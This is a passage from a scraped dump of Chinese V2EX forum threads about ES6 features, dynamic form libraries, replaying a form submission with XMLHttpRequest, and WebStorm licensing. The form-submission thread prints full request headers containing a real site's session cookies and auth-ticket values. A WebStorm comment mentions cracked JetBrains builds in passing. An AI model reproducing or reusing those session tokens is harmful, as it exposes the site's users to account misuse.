来说，是一个伟大的功能，它可以使代码更简短。我们在比较早的时候将箭头函数引入，这样就可以在后面使用它了。下面的代码片段展示了箭头函数，以及在 ES5 中的相同功能：</p>\n<div class=\"highlight\"><pre>let books = [{title: 'X', price: 10}, {title: 'Y', price: 15}];\n    let titles = books.map( item =&gt; item.title );\n    // ES5 equivalent:var titles = books.map(function(item) {\n      return item.title;\n            });\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://t.im/vdyu\"><strong>Run this code</strong></a></p>\n\n<p>使用箭头函数不需要 function 关键字，只有 0 个或多个参数、“=&gt;”和函数表达式。</p>\n\n<p>return 是默认就有的。而且，不管有没有参数，你都必须使用括号。</p>\n<div class=\"highlight\"><pre>// No argumentsbooks.map( () =&gt; 1 ); // [1, 1]\n    // Multiple arguments[1,2].map( (n, index) =&gt; n * index ); // [0, 2]\n</pre></div>\n\n<p>如果你需要复杂的逻辑，把函数表达式放进块（{ … }）中：</p>\n<div class=\"highlight\"><pre>let result = [1, 2, 3, 4, 5].map( n =&gt; {\n    n = n % 3;\n    return n;\n            });\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://t.im/vdyv\"><strong>Run this code</strong></a></p>\n\n<p>箭头函数不仅可以减少代码量，与普通函数也有不同。箭头函数会从周围的环境中继承 this 和 arguments 。这意味着你可以摆脱像 var that = this 一样丑陋的语句，不需要把函数绑定到正确的上下文中。下面是一个例子：</p>\n<div class=\"highlight\"><pre>let book = {\n     title: 'X',\n     sellers: ['A', 'B'],\n    printSellers() {\n       this.sellers.forEach(seller =&gt; console.log(seller + ' sells ' + this.title));\n       }}\n    // ES5 equivalent:var book = {\n    title: 'X',\n    sellers: ['A', 'B'],\n    printSellers: function() {\n    var that = this;\n    this.sellers.forEach(function(seller) {\n    console.log(seller + ' sells ' + that.title)\n       })\n     }\n            }\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://t.im/vdym\"><strong>Run this code</strong></a></p>\n\n<p>此文为译文，如有问题请加 QQ 群 105454604 联系群主</p>\n</div></div>"], "reply": "21", "tittle": "ECMAScript 6（ ES6）： JavaScript 的下一个版本有什么新东西（一）", "comment": ["ECMAScript 6 是 JavaScript 的下一个版本？还是 ECMAScript 的下一个版本？", " \r", "ECMAScript6 就是 ECMAScript2015   已经出了，下一个版本是 ECMAScript2016\r", "JavaScript 差不多就是 ECMA+DOM+BOM 。。。", "\r", "\r", "拿好不谢", "边学边练习的 free 内容，可以看看：\r", "ES6 已经定稿，下一版本应该是 ES7...", " 我刚想说 不是下一个版本，是这一个版本，下一个版本是 ES7", " 感谢指正，这篇是前几天刚刚发布在 smashingmagazine 上的一篇文章，因为内容比较全面，所以想翻译一下，原作者用了这样的标题，作为一篇译文，改掉也不太好，所以就直接写成这个了。", "\r", "可耻地做个广告", " 以后好像按年命名了，，，可能现在都习惯快速迭代了。", " 同学不要这么凶残，这篇是前几天刚发布在 smashingmagazine 上的一篇文章，因为内容比较全面，所以想翻译一下", " Mozilla Developer Network 上 ES6 教程比较详细。", "=> 就和 Java 8 的 Lamada 一样啦。\r", "\r", "我觉得 ES 6 应该 OOP 算是最大的特性吧。", " 还是看 MDN 吧。。", " DOM 和 BOM 是浏览器环境下的 ES6 语言本身不包含这些。", " \r", "我说的是 javascript...", "第一个特性的第二个例子，在 i 存在的情况下，使用 j   不是顺理成章吗？非要再次用  i  ，有什么特别的好处吗？", "这代码格式看得我头晕，缺少好多换行，反花括号满天飞呀。建议发布前检查一下啊。另外推荐 ", " ，对 ES6 的新特性有比较简要的介绍。", " 感谢指正，下次一定注意，不过 V2EX 不能后续编辑感觉好难受啊  T.T", " \r", "重点是 let 关键声明的变量的作用域。\r", "原有的 js 是不支持像 c 那样的块级作用域的，假设你在 for 循环中声明了计数变量 i ，那么在 for 循环结束后 i 是依然存在的，那就极有可能对你后面的代码造成影响。现在你使用 let 去声明 i ，在块级作用域结束的时候变量 i 就失效了。", " 那还有 flash JScript Node 在不同宿主环境下实现的 API 等。。", " c 没有， cpp 才有"]},
{"content": ["<div class=\"topic_content\">后端生成 json 格式串，前台根据 json 生成对应表单项,  ,  input,  textarea ,select, radio ,checkbox 之类的\r<br>\r<br>这几天找了好多，比如：\r<br>\r<br><a target=\"_blank\" href=\"https://github.com/danhunsaker/angular-dynamic-forms\" rel=\"nofollow\">https://github.com/danhunsaker/angular-dynamic-forms</a>  ，这个是 AngularJS ， demo 在 IE ， firefox, chrome 展示的效果都不一样， 时间选择框只有在 chrome 下正常， firefox 出不来， edge ， IE 时间选择展示的很奇怪，类似 IOS 那种风格选择年月日。\r<br>\r<br><a target=\"_blank\" href=\"https://github.com/wingspan/wingspan-forms\" rel=\"nofollow\">https://github.com/wingspan/wingspan-forms</a> ， 这个是 react ，看了半天，不懂得怎么用\r<br><a target=\"_blank\" href=\"https://github.com/ismaelga/react-json-editor/\" rel=\"nofollow\">https://github.com/ismaelga/react-json-editor/</a>  这个也是 react ，不会用\r<br>\r<br>vue.js 的动态表单，github上没找到现成的</div>"], "reply": "10", "tittle": "动态生成表单元素，用哪个好， react， AngularJS 还是 vue.js", "comment": ["[\r", "    {\r", "        \"input\":{\r", "            \"type\":\"text\",\r", "            \"name\":\"some-name\",\r", "            \"id\":\"some-id\",\r", "            \"placeHolder\":\"xxxx\",\r", "            \"valid-expr\":\"正则表达校验\"\r", "            \"value\":\"xxxxxxx\"\r", "        }\r", "    },\r", "   {\r", "        \"input\":{\r", "            \"type\":\"text\",\r", "            \"name\":\"some-name2\",\r", "            \"id\":\"some-id2\",\r", "            \"placeHolder\":\"xxxx\",\r", "            \"valid-expr\":\"正则表达校验\"\r", "            \"value\":\"xxxxxxx\"\r", "        }\r", "    }\r", "]\r", "\r", "\r", "类似这样的，自己写成 json ，然后前端 js 自己解析下就好了。不是什么很难的东西，不需要因为解决单个这样的需求而引入一堆不必要的类", "表单这种东西无论你用哪个框架，都要自己整一个封装。\r", "我会建议自己写一个，不是很复杂。重用性很高。", "前端发展这么久，居然连这个都没有统一，是不是很悲哀。", " \r", " \r", "\r", "自己写就是费时费力吧，写出来的 JS 说不定还有浏览器兼容问题， github 上有现成其实是最好的，至少经过多人验证过，基本应用没问题。", "AngularJS 对 IE 兼容得不太好啊，你试试 AvalonJS 嘛。相对来说 MVVM 框架要简单得多：", " 都用框架了还扯什么兼容问题？只是根据自己的动态数据做一个封装而已。表单是最基础的东西了，如果前端连这个能力都不具备，那还能做啥？", " 关于浏览器兼容问题 你要兼容 ie67 这仨都不行。", " 你的功能需求很少，没必要上框架，我同意 1L 所说的，自己实现一个，简单省事还省得跟框架打交道。", "就这点需求？手里有什么库用什么就行了。\r", "直白点说，兼容性都处理不好，要你前端何用？", "简单工作量也不多还是自己写个吧，依赖框架没必要，毕竟你这工作也不繁琐的\r", "vuejs ，一直在用，如果确实需要，那就推荐他把"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://www.greasespot.net/\" rel=\"nofollow\">http://www.greasespot.net/</a></div>"], "reply": "目前尚无回", "tittle": "分享一个网站，想研究 Userscript 的都可以进来", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img src=\"//dn-cnode.qbox.me/FlpD9s5XhU8eI0SJe8cyu1XEWXCP\" alt=\"QQ 截图 20151103202108.png\"></p>\n\n<p>作者： Lars Kappert<br>\n原文： <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.smashingmagazine.com/2015/10/es6-whats-new-next-version-javascript/\">http://www.smashingmagazine.com/2015/10/es6-whats-new-next-version-javascript/</a><br>\n译：王瑾南  陈万幸<br>\n野狗官网： <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.wilddog.com/\">https://www.wilddog.com/</a><br>\n野狗官博： <a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.wilddog.com\">https://blog.wilddog.com</a></p>\n\n<p>昨天因为标题问题被大家吐槽了，稍微修改一下。<br>\n上一部分介绍了变量，这部分来介绍一下字符串和数组。</p>\n\n<h1>字符串</h1>\n\n<p><strong>方法</strong></p>\n\n<p>String 原型已经有几个简单的方法，其中的大多数是借助于 indexOf()方法来实现:</p>\n<div class=\"highlight\"><pre>'my string'.startsWith('my'); //true\n'my string'.endsWith('my'); // false\n'my string'.includes('str'); // true\n</pre></div>\n\n<p>现在添加了一个创建重复字符串的简单方法：</p>\n<div class=\"highlight\"><pre>'my '.repeat(3); // 'my my my '\n</pre></div>\n\n<p><strong>模板文本</strong></p>\n\n<p>模版文本提供一个简单方法来创建字符串和插入字符串。你可能对它的语法已经非常熟悉，使用 $ 和 花括号: ${..}。模版文本是由花括号括起来的，下面有一个示例：</p>\n<div class=\"highlight\"><pre>let name = 'John',\n   apples = 5,\n   pears = 7,\n   bananas = function() { return 3; \n}\n\nconsole.log(`This is ${name}.`);\n\nconsole.log(`He carries ${apples} apples, ${pears} pears, and ${bananas()} bananas.`);\n// ES5 equivalent:console.log('He carries ' + apples + ' apples, ' + pears + ' pears, and ' + bananas() +' bananas.');\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://babeljs.io/repl/#?experimental=false&amp;evaluate=true&amp;loose=false&amp;spec=false&amp;code=let%20name%20=%20%27John%27,%0A%20%20%20%20apples%20=%205,%0A%20%20%20%20pears%20=%207,%0A%20%20%20%20bananas%20=%20function%28%29%20%7B%20return%203;%20%7D%0A%0Aconsole.log%28%60This%20is%20%24%7Bname%7D.%60%29;%0A%0Aconsole.log%28%60He%20carries%20%24%7Bapples%7D%20apples,%20%24%7Bpears%7D%20pears,%20and%20%24%7Bbananas%28%29%7D%20bananas.%60%29;%0A\">Run this code</a></p>\n\n<p>上面的示例相比 ES5 ，仅仅是方便了字符串连接。模版文本也适用于多行字符串。空白文本也是字符串的一部分：</p>\n<div class=\"highlight\"><pre>let x = `1...\n2...\n3 lines long!`; // Yay\n// ES5 equivalents:var x = \"1...\\n\" + \n\"2...\\n\" +\n\"3 lines long!\";\n\nvar x = \"1...\\n2...\\n3 lines long!\";\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://babeljs.io/repl/#?experimental=false&amp;evaluate=true&amp;loose=false&amp;spec=false&amp;code=let%20name%20=%20%27John%27,%0A%20%20%20%20apples%20=%205,%0A%20%20%20%20pears%20=%207,%0A%20%20%20%20bananas%20=%20function%28%29%20%7B%20return%203;%20%7D%0A%0Aconsole.log%28%60This%20is%20%24%7Bname%7D.%60%29;%0A%0Aconsole.log%28%60He%20carries%20%24%7Bapples%7D%20apples,%20%24%7Bpears%7D%20pears,%20and%20%24%7Bbananas%28%29%7D%20bananas.%60%29;%0A\">Run this code</a></p>\n\n<h1>数组</h1>\n\n<p>Array 对象现在有一些新的静态类方法，以及 Array 原型的新方法。</p>\n\n<p>Array.from ，将一个类数组对象或可迭代对象转换成真实的数组。示例：</p>\n\n<ul>\n<li>arguments 中传入一个函数； </li>\n<li>getElementsByTagName()返回节点列表；</li>\n<li><p>新的 Map 和 Set 。</p>\n<div class=\"highlight\"><pre>let itemElements = document.querySelectorAll('.items');let items = Array.from(itemElements);\nitems.forEach(function(element) {\nconsole.log(element.nodeType)\n});\n\n// A workaround often used in ES5:let items =       Array.prototype.slice.call(itemElements);\n</pre></div></li>\n</ul>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://babeljs.io/repl/#?experimental=false&amp;evaluate=true&amp;loose=false&amp;spec=false&amp;code=let%20itemElements%20=%20document.querySelectorAll%28%27div%27%29;%0Alet%20items%20=%20Array.from%28itemElements%29;%0Aitems.forEach%28function%28element%29%20%7B%0A%20%20%20%20console.log%28element.nodeType%29%0A%7D%29;%0A\">Run this code</a></p>\n\n<p>在上面的例子中可以看到， items 数组有 foreach 方法，但是 itemelements 是没有的。</p>\n\n<p>Array.from 有一个有趣的特点：第二个参数是可选参数 mapfunction 。这样就可以在调用时创建一个映射数组：</p>\n<div class=\"highlight\"><pre>let navElements = document.querySelectorAll('nav li');let navTitles = Array.from(navElements, el =&gt; el.textContent);\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://babeljs.io/repl/#?experimental=false&amp;evaluate=true&amp;loose=false&amp;spec=false&amp;code=let%20navElements%20=%20document.querySelectorAll%28%27nav%20li%27%29;%0Alet%20navTitles%20=%20Array.from%28navElements,%20el%20=%3E%20el.textContent%29;%0Aconsole.log%28navTitles.join%28%27%27%29%29;\">Run this code</a></p>\n\n<p>Array.of 相当于一个 Array 构造器，当传入一个数字参数时返回的数组会只包含此参数（即只有一个元素），结构是 Array.of 有优于 new Array() 。然而，在大多数情况下，我们更习惯于使用数组直接量。</p>\n<div class=\"highlight\"><pre>let x = new Array(3); // [undefined, undefined, undefined]\nlet y = Array.of(8); // [8]\nlet z = [1, 2, 3]; // Array literal\n</pre></div>\n\n<p>最后重要的一点， Array 原型也增加了一些方法。我相信 find 方法将会受到大多数 JavaScript 开发者的欢迎。</p>\n\n<ul>\n<li>find 返回值是在回调函数中第一个返回 true 的元素.</li>\n<li>findIndex 返回值是在回调函数中第一个返回 true 的元素的索引.</li>\n<li><p>fill 根据所给参数来更改数组元素的值.</p>\n<div class=\"highlight\"><pre>[5, 1, 10, 8].find(n =&gt; n === 10) // 10\n\n[5, 1, 10, 8].findIndex(n =&gt; n === 10) // 2\n\n[0, 0, 0].fill(7) // [7, 7, 7]\n[0, 0, 0, 0, 0].fill(7, 1, 3) // [0, 7, 7, 7, 0]\n</pre></div></li>\n</ul>\n\n<p>此文为译文，如有问题请加 QQ 群 105454604 联系群主</p>\n</div></div>"], "reply": "1", "tittle": "ECMAScript 6（ ES6）有什么新东西（二）", "comment": ["block"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>问题</h2>\n\n<p>RT 。网站是这个：<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://eq.wowow.co.jp/CGI/enq/engeki2015/index.cgi/conf/\">https://eq.wowow.co.jp/CGI/enq/engeki2015/index.cgi/conf/</a></p>\n\n<p>网站传输用的是<code>multipart/form-data</code>,不过我用 post 模拟提交的数据和 submit 格式是一样的。<br>\n而且看了下两个的 request header 基本上也没差了，但是 respone 的 header 和页面就差了不少。后台没写过不清楚，<strong>看了下两个最大的区别应该是一个文档类型是<code>document</code>一个是<code>xhr</code>,想问下后台的话可以根据这个直接判定返回的页面吗？</strong></p>\n\n<h2>相关数据：</h2>\n\n<h3>我使用的代码：</h3>\n<div class=\"highlight\"><pre>var data={\n    key:'conf',\n    mem_flg:'',\n    page:'1',\n    back_page:'',\n    '000021914':'ssd',\n    '000021912':'男性',\n    '000021913':'20 代',\n    '000021911':'徳島県',\n    '000021916':'sssd',\n    '000021926':'dsds',\n    '000021918':'dsdd',\n    '000021920':'ads',\n    '000021922':'adsds',\n    '000021923':'',\n    '000021924':'0001::同意する',\n    '000021925':'0001::同意する',\n    submit:'次　へ '\n};\nfunction sendData(data) {\n  var XHR = new XMLHttpRequest();\n  var FD  = new FormData();\n\n  for(name in data) {\n    FD.append(name, data[name]);\n  }\n  XHR.addEventListener('load', function(event) {\n    console.log('Yeah! Data sent and response loaded.');\n  });\n  XHR.addEventListener('error', function(event) {\n    console.log('Oups! Something goes wrong.');\n  });\n  XHR.open('POST', 'https://eq.wowow.co.jp/CGI/enq/engeki2015/index.cgi/conf/');\n  XHR.setRequestHeader('Upgrade-Insecure-Requests', '1');\n  XHR.setRequestHeader('Cache-Control','max-age=0');\n  XHR.send(FD);\n}\nsendData(data)\n</pre></div>\n\n<h3>submit 提交的 request header ：</h3>\n<div class=\"highlight\"><pre>POST /CGI/enq/engeki2015/index.cgi/conf/ HTTP/1.1\nHost: eq.wowow.co.jp\nConnection: keep-alive\nContent-Length: 1778\nCache-Control: max-age=0\nOrigin: https://eq.wowow.co.jp\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary5LSRJwQdceXFo8uo\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nX-FirePHP-Version: 0.0.6\nReferer: https://eq.wowow.co.jp/CGI/enq/engeki2015/index.cgi/conf/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4\nCookie: wowow2_MGSID_AuthTicket=57d35173edd644dac7cca0ada9fe586a2b874b7a; wowow2_MGSID=0117130a152e480144668844800011862; enq_plus_000002528=6645110a152e550144677804300003180\n</pre></div>\n\n<h3>submit 提交后返回的 respone header ：</h3>\n<div class=\"highlight\"><pre>HTTP/1.1 200 OK\nDate: Fri, 06 Nov 2015 02:48:44 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store, no-cache, post-check=0, pre-check=0\nExpires: -1\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nTransfer-Encoding: chunked\nContent-Type: text/html;charset=UTF-8\n</pre></div>\n\n<h3>ajax post 模拟的 request header ：</h3>\n<div class=\"highlight\"><pre>POST /CGI/enq/engeki2015/index.cgi/conf/ HTTP/1.1\nHost: eq.wowow.co.jp\nConnection: keep-alive\nContent-Length: 1754\nOrigin: https://eq.wowow.co.jp\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryj73JdouNDpXuT6ep\nCache-Control: max-age=0\nX-FirePHP-Version: 0.0.6\nAccept: */*\nReferer: https://eq.wowow.co.jp/CGI/enq/engeki2015/index.cgi/conf/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4\nCookie: wowow2_MGSID_AuthTicket=57d35173edd644dac7cca0ada9fe586a2b874b7a; wowow2_MGSID=0117130a152e480144668844800011862; enq_plus_000002528=6645110a152e550144677804300003180\n</pre></div>\n\n<h3>ajax 提交后返回的 respone header ：</h3>\n<div class=\"highlight\"><pre>HTTP/1.1 200 OK\nDate: Fri, 06 Nov 2015 02:49:37 GMT\nServer: Apache\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nTransfer-Encoding: chunked\nContent-Type: text/html;charset=UTF-8\n</pre></div>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>感谢 @bertonzh 的检查，是我傻逼了，发送的字段内容复制错了。。这个问题算是解决了。。</p>\n\n<p>不过为了不让各位的心思白费，扩展下问题吧：<br>\n<strong>如果前端不配合的情况下</strong>，后台可以直接判断出来数据是 form 表单的 submit 提交还是利用 ajax 的 post 提交的吗？</p>\n</div></div>"], "reply": "26", "tittle": "为什么用 ajax 模拟 form 表单提交返回页面总是和直接 submit 提交的不一样", "comment": ["可以啊， ajax 本质上就是一个 xhr 请求，和 form 的当然不一样了。\r", "\r", "有一些框架里面都可以判断请求是不是 ajax 的，然后返回不一样的内容。", " 所以其实就是后台一旦接收到是 xhr 请求的话就直接返回 a 页面，如果是 form 提交就 b 页面这样么？因为这里的 form 和 xhr 都是 post 的，我以为对后台来说没什么区别呢。。", "其实可以 submit 和 ajax 提交的地址不一样，就能各自返回不同的东西了", " 不不不，我现在不是这个意思，而是我想让 post 和 submit 的返回结果一样，但是不管怎么试都试不出来，不知道是我前端哪里疏漏了还是后台他们可以直接判断来源。。", " 我查了下很多资料里都提到了“ HTTP_X_REQUESTED_WITH ”这个 header 头，但是这个头貌似是要前端加上去的，而原生的是不带这个头的，所以想问下在前端不配合的情况下，后台可以直接筛选出来这两种方式么", " XHR 和表单提交本质上都是 HTTP 请求，怎么就不一样了？\r", "\r", "感觉是 Accpet 的问题。楼主可以先试试修改。不过有一些请求头在 XHR 里面是修改不了的，可以考虑用代理工具 charles 拦截请求，在 charles 里面修改。", "什么是 post 和 submit 返回的结果不一样？你的 js 是写在哪里的？", " 都是 http 请求，但是服务器可以分辨出来是 xhr 还是普通的表单提交。\r", "\r", "我这里没有说清楚，抱歉了。", "ajax 在请求头里会有一个特殊的标识符,后台可以用来判断", " 那个页面上，用 chrome 开发者工具的 console 里直接运行我那段 js 模拟 post 提交返回的页面和直接用他的表单提交得到的结果是不是一样的。\r", "我就是不知道这个是怎么做到的。不知道是我前端的问题还是后台可以限制。。", " 但是我这里贴出来的 header 里没有明显的字段差别啊。", " 能问下是怎么做到的么？给个关键词就好。\r", "我刚刚找了下大部分说的都是区分前端框架的 ajax ，但是那个是因为前端框架手动加了个字段。。", "后台可以根据 HTTP_X_REQUESTED_WITH 判断是否为 AJAX 方式提交。\r", "这个是 TP 的判断方法。\r", "protected function isAjax() {\r", "        if(isset($_SERVER['HTTP_X_REQUESTED_WITH']) ) {\r", "            if('xmlhttprequest' == strtolower($_SERVER['HTTP_X_REQUESTED_WITH']))\r", "                return true;\r", "        }\r", "        if(!empty($_POST[C('VAR_AJAX_SUBMIT')]) || !empty($_GET[C('VAR_AJAX_SUBMIT')]))\r", "            // 判断 Ajax 方式提交\r", "            return true;\r", "        return false;\r", "    }", " 我刚看了一下 ci 的代码，和你说的这个基本是一个意思", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r", "\r", "这个不一样啊", " \r", " \r", "\r", "Ajax 的 X_REQUESTED_WITH 头是 Ajax 库加上去的。\r", "如果是自己使用 XMLHttpRequest 实现，则没有这个头。", " @", " \r", "但是这个文件头应该不是全部的 ajax 请求都有的。。我前面贴的原生 xhr 的 post 的 header 里并没有这个字段", " 我能看出来的区别也就这里面了。。但是`Accept`这个字段前端是可以改的。我那里的 js 代码里只要加一句\r", "“ XHR.setRequestHeader('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');”\r", "就可以改掉了。。\r", "而且我刚刚加了试一下和之前的也没啥区别，一样是不同的页面", " 抱歉 v2 的回复提醒好像有点抽，前面 6 楼的回复没看到。我把 accept 改成一样的了，但是还是没什么效果。。", " \r", "我试了，是有的。在域名下面控制台输入。\r", "$.ajax({\r", "contentType:\"multipart/form-data\"\r", "})\r", "\r", "Accept:*/*\r", "Accept-Encoding:gzip, deflate, sdch\r", "Accept-Language:zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4\r", "Cache-Control:no-cache\r", "Connection:keep-alive\r", "Content-Type:multipart/form-data\r", "Cookie:enq_plus_000002528=8597130a152e540144678235400000449\r", "Host:eq.wowow.co.jp\r", "Pragma:no-cache\r", "Referer:https://eq.wowow.co.jp/CGI/enq/engeki2015/index.cgi/conf/\r", "User-Agent:Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\r", "X-Requested-With:XMLHttpRequest", " $.ajax 是框架(jq 或者 zepto 之类的)封装的 xhr 不是原生的 xmlHttpRequest 。。我前面正文里贴过原生的 xhr 代码，你可以用那个试试看。", " \r", "楼主仔细检查下你的表单内容。\r", "\r", "这三个字段有问题：\r", "-------\r", "    '000021912':'男性',\r", "    '000021913':'20 代',\r", "    '000021911':'徳島県',", "这是原始表单：\r", "\r", "0001::男性\r", "------WebKitFormBoundaryWm2VeBo2patOxQ5k\r", "Content-Disposition: form-data; name=\"000021913\"\r", "\r", "0002::20 代\r", "------WebKitFormBoundaryWm2VeBo2patOxQ5k\r", "Content-Disposition: form-data; name=\"000021911\"\r", "\r", "0007::徳島県\r", "------WebKitFormBoundaryWm2VeBo2patOxQ5k\r", "Content-Disposition: form-data; name=\"000021916\"", " 我去还真是- -是我傻逼了。。不好意思。。", "前面一条 boundary 和值的前后顺序有问题。值也被我改错了。楼主不要直接复制粘贴。", " 嗯，我刚刚改了下已经成功了。谢谢。。可能昨天要复制的字段比较多所以后面只看了 key 的值， name 里的想当然了。多谢"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>记得之前是一个版本付费，只要不是夸版本升级，就可以进行小版本升级，今天看了下 webstorm 11 的新特性，然后看了下价格，发现收费策略改变了。<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.jetbrains.com/webstorm/buy/\">https://www.jetbrains.com/webstorm/buy/</a><br>\n什么时候才有优惠活动啊，求告知</p>\n</div></div>"], "reply": "25", "tittle": "webstorm 的收费策略改变了？现在改为年收费了？", "comment": ["现在就是优惠期啊，折扣力度还是挺大的。\r", "订购一年的话自动获得 perpetual fallback license ，同样可以小版本升级。", "收费的和破解的差距很大吗？", " 一个正版一个盗版。。", "不知道学生汪的免费账号还能用多久", " 不是给个一年的授权吗", "之前应该是购买后一年内可以免费升级。一年以后升级需要更新授权。但是不升级也可以继续用。\r", "我的 Webstorm 就是上个月过期了。去原来购买的网站上看，涨到 700 多了...", "老用户..现在不是 6 折两年吗..才 35 刀....", " 昨天刚买了新的 webstorm 授权，我的老帐号再 2014 年过期了，目前官网的优惠是 35 刀，好像还送了一年，到 2017 年过期。", " 错。\r", "到期后给你发一封邮件，确认后继续免费一年。\r", "到期后不确认转成免费用户，试用 30 天。", " 官网的确挺便宜的。我之前在国内某软件代理商买的，不知道为什么今年这么贵了..", "最近怎么这么多这样的帖子，是有星际运输艇最近刚到么？", " 应该不是转成免费用户吧，购买的时候是拥有某一个版本的永久使用权的。我的 IDEA 13 的时候买的，一年内升到 14 。现在过期了，但是 14 的使用权不会丢失，只不过不能升 15 。\r", "过期时间不超过一年的，现在可以一年的钱买两年的服务，第三年 6 折。现在的也是购买 1 年获得这一个版本的使用权，不会收回去。", " 干嘛不在官网买？ 我的 IDEA 是赶上打折的时候买的， 99 刀", "以前也是一年一收", " 不是吧。。我没仔细读。", " 邮件里面没有提到转为免费用户，也没有说一个月试用期等等。你说的应该是现在的新规则，前几天的。\r", "邮件里面说的是如果我在过期之后续费，那么新的有效期是从过期日开始而不是续费日。", " 当时好像还比较贵", "jb 的东西向来就是按年收费的啊", "引用自微博：\r", "---\r", "JetBrains 中国：回复 @大伟哥是你叫的么: 如果您是新购买 IntelliJ IDEA 的个人用户，我们的订阅授权方式如下。 年费： US $  149 /第一年    US $  119 /第二年    US $  89 /第三年及以后     月费： US $  14.9     在有效订阅期间您可以使用任何新版本，如果您决定停止订阅，您有机会获得指定版本的永久授权。", "JB java 代码破解的全家桶，可以授权现在 7 个产品。呵呵 但是 jb 改了策略之后就不行了。", " 我说的是教育续订，不是购买的那种。我是教育用户。\r", " 邮件里面没说，我是过期两天之后打开产品，提示账号过期，然后显示试用时间为 30 天 30 days free-trial 。打开邮箱翻出一周前的邮件，续订之后时间是从过期那天开始计算的。", " 那我们学校不收回 edu 邮箱岂不是可以一直免费？", " 我也这么觉得……我 7 月份毕业的， 10 月 24 号到期， 26 还是 27 号更新的授权，明年 1024 又是一个轮回（大雾）", "用 Community 版本基本可以解决 java 开发了，支持 maven, gradle ， Groovy ， Scala 等", " 这个“有机会获得”怎么有一种“ iPhone 6s 等你来抽”的感觉\r", "\r", " 看来功能没有限制，但是准确来说教育授权“不能”用于商业用途。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img src=\"//dn-cnode.qbox.me/FlpD9s5XhU8eI0SJe8cyu1XEWXCP\" alt=\"QQ 截图 20151103202108.png\"></p>\n\n<p>作者： Lars Kappert<br>\n原文： <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.smashingmagazine.com/2015/10/es6-whats-new-next-version-javascript/\">http://www.smashingmagazine.com/2015/10/es6-whats-new-next-version-javascript/</a><br>\n审校：陈万幸<br>\n野狗官网： <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.wilddog.com/\">https://www.wilddog.com/</a><br>\n野狗官博： <a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.wilddog.com\">https://blog.wilddog.com</a></p>\n\n<h1>MATH</h1>\n\n<p>Math 对象中采用了一些新的方法。</p>\n\n<p>1.sign 把一个数字符号返回为 1 ，<br>\n2.-1 或 0 。 trunc 返回参数的整数部分。<br>\n3.cbrt 返回一个数的立方根。</p>\n<div class=\"highlight\"><pre>Math.sign(5); // 1\nMath.sign(-9); // -1\n\nMath.trunc(5.9); // 5\nMath.trunc(5.123); // 5\n\nMath.cbrt(64); // 4\n</pre></div>\n\n<h1>传播操作符</h1>\n\n<p>传播操作符(...)是一种在特定时间为扩展数组元素而采取的非常实用的句法，例如在处理函数调用中参数的时候。可能最能展示其实用性的方法就是举例。</p>\n\n<p>首先，让我们来看看如何在另一组数组中拓展某一数组中的元素：</p>\n<div class=\"highlight\"><pre>let values = [1, 2, 4];\nlet some = [...values, 8]; // [1, 2, 4, 8]\nlet more = [...values, 8, ...values]; // [1, 2, 4, 8, 1, 2, 4]\n\n// ES5 equivalent:\nlet values = [1, 2, 4];\n// Iterate, push, sweat, repeat...\n// Iterate, push, sweat, repeat...\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://babeljs.io/repl/#?experimental=false&amp;evaluate=true&amp;loose=false&amp;spec=false&amp;code=let%20values%20=%20%5B1,%202,%204%5D;%0Alet%20some%20=%20%5B...values,%208%5D;%0Alet%20more%20=%20%5B...values,%208,%20...values%5D;%0Aconsole.log%28some%29;%0Aconsole.log%28more%29;\">Run this code</a></p>\n\n<p>展开操作句法在用于调用函数与参数时功能也很强大：</p>\n<div class=\"highlight\"><pre>let values = [1, 2, 4];\n\ndoSomething(...values);\n\nfunction doSomething(x, y, z) {\n   // x = 1, y = 2, z = 4\n}\n\n// ES5 equivalent:\ndoSomething.apply(null, values);\n</pre></div>\n\n<p><a target=\"_blank\" rel=\"nofollow\" 